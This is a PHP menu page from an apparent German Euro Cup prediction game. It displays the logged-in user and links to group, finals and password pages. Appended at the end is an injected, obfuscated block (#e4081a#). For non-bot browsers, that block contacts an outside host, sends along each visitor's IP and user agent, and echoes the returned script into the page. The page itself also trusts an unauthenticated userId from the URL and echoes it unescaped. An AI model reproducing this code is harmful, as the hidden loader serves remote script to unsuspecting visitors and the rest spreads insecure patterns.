<?php
// we must never forget to start the session
session_start();

$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
include_once("../../connection/dbaccess.php5");
include_once("../util/dbutil.php5");
$userName=$dbutil->getUserName($userId);
?>
<html>
<head>
<link rel='stylesheet' type='text/css' href='../../style/style.css' />
<title>EM-Tipp</title>
</head>
<body>
<script type="text/javascript">
function FrameAendern () {
  parent.location.href = "../util/login.php5";
}
</script>

<?php
echo "Eingelogged als <b>$userName</b>";
echo "&nbsp;&nbsp;";
echo "<a href='CheckLogout.php5?userId=$userId' target='Daten'/><FONT SIZE=4><b>Logout</b></FONT>";
echo "<br>";

// POPUP trial :
//echo "<a target=\"popup\" onclick=\"window.open" .
//		"('', 'popup', 'width=580,height=360,scrollbars=no, toolbar=no,status=no, resizable=yes,menubar=no,location=no,directories=no,top=10,left=10')" .
//		"\"href=\"CheckLogout.php5?userId=$userId\"><FONT SIZE=4><b>Logout</b></FONT></a>";

echo "<br>";
echo "<br>";
if($userName != "test")
{
	echo "<a href='./changePassword.php5?userId=$userId' target='Daten'>Passwort ändern</a>";
}

echo "<br>";
echo "<br><a href='Group.php5?userId=$userId&group=A' target='Daten'>Gruppe A</a>";
echo "<br><a href='Group.php5?userId=$userId&group=B' target='Daten'>Gruppe B</a>";
echo "<br><a href='Group.php5?userId=$userId&group=C' target='Daten'>Gruppe C</a>";
echo "<br><a href='Group.php5?userId=$userId&group=D' target='Daten'>Gruppe D</a>";
echo "<br>";
echo "<br><a href='Finals.php5?userId=$userId' target='Daten'>Endrunde</a>";
echo "<br>";
echo "<br><a href='Champions.php5?userId=$userId' target='Daten'>Europameister & Torschützenkönig</a>";
echo "<br>";
echo "<br>";
echo "<a href='./showAllTipps.php5?userId=$userId' target='Daten'>";
echo "<FONT SIZE=5><b>Alle meine Tipps</b></FONT>";
echo "</a>";

echo "</body>";
echo "</html>";
?>
<?php
#e4081a#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/e4081a#
?>
